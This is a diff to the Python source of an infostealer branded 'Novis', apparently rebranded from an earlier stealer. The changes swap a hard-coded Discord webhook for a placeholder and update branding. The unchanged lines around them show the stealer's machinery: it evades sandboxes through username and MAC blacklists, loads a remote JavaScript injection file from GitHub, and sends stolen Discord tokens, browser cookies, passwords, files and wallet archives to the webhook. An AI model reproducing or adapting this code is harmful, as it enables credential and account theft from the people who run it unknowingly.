@@ -20,6 +20,7 @@ import uuid
 import socket
 import getpass
 
+#PLEASE INPUT YOUR WEBHOOK HERE TOO OR NOVIS WILL NOT WORK PROPERLY! (line 54)
 
 
 blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
@@ -47,9 +48,8 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
 
 
-
-
-wh00k = "https://discord.com/api/webhooks/1117030594161934386/yrnIW8ee6iruE3dSrXNXGVQuT050d-wgz4kPFHRdGq42EJB-gsH7HMiOfqhCDWGIjhy6"
+#novis will not be functional without token being here too!
+wh00k = "PUT YOUR WEBHOOK HERE"
 inj_url = "https://raw.githubusercontent.com/r3nko/injection/main/index.js"
     
 DETECTED = False
@@ -356,7 +356,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://i.imgur.com/S0Zqp4R.jpg"
+        pfp = "https://i.imgur.com/gTyRd5S.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -415,15 +415,15 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "0483",
-                "icon_url": "https://i.imgur.com/LopW5g6.png"
+                "text": "0764",
+                "icon_url": "https://i.imgur.com/KE11QtB.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://i.imgur.com/LopW5g6.png",
+        "avatar_url": "https://i.imgur.com/gTyRd5S.png",
         "username": "Novis",
         "attachments": []
         }
@@ -453,16 +453,16 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "Novis | Cookies Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [NovisCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "0978",
-                        "icon_url": "https://i.imgur.com/LopW5g6.png"
+                        "text": "0765",
+                        "icon_url": "https://i.imgur.com/KE11QtB.png"
                     }
                 }
             ],
-            "username": "Novis",
-            "avatar_url": "https://i.imgur.com/LopW5g6.png",
+            "username": "Novis Stealer",
+            "avatar_url": "https://i.imgur.com/gTyRd5S.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -479,16 +479,16 @@ def upload(name, link):
             "embeds": [
                 {
                     "title": "Novis | Password Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [NovisPasswords.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "0834",
-                        "icon_url": "https://i.imgur.com/LopW5g6.png"
+                        "text": "0766",
+                        "icon_url": "https://i.imgur.com/KE11QtB.png"
                     }
                 }
             ],
             "username": "Novis Stealer",
-            "avatar_url": "https://i.imgur.com/LopW5g6.png",
+            "avatar_url": "https://i.imgur.com/gTyRd5S.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -510,13 +510,13 @@ def upload(name, link):
                     "name": "Novis | File Stealer"
                 },
                 "footer": {
-                    "text": "9873",
-                    "icon_url": "https://i.imgur.com/LopW5g6.png"
+                    "text": "0767",
+                    "icon_url": "https://i.imgur.com/KE11QtB.png"
                 }
                 }
             ],
             "username": "Novis Stealer",
-            "avatar_url": "https://i.imgur.com/LopW5g6.png",
+            "avatar_url": "https://i.imgur.com/gTyRd5S.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -541,7 +541,7 @@ def upload(name, link):
 def wr1tef0rf1l3(data, name):
     path = os.getenv("TEMP") + f"\cr{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Novis STEALER BEST -->\n\n")
+        f.write(f"<--Novis Stealer ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -706,17 +706,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Novis Zips",
+            "title": "Novis | Accounts",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "6983",
-                "icon_url": "https://i.imgur.com/LopW5g6.png"
+                "text": "0768",
+                "icon_url": "https://i.imgur.com/KE11QtB.png"
             }
             }
         ],
         "username": "Novis",
-        "avatar_url": "https://i.imgur.com/LopW5g6.png",
+        "avatar_url": "https://i.imgur.com/gTyRd5S.png",
         "attachments": []
     }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
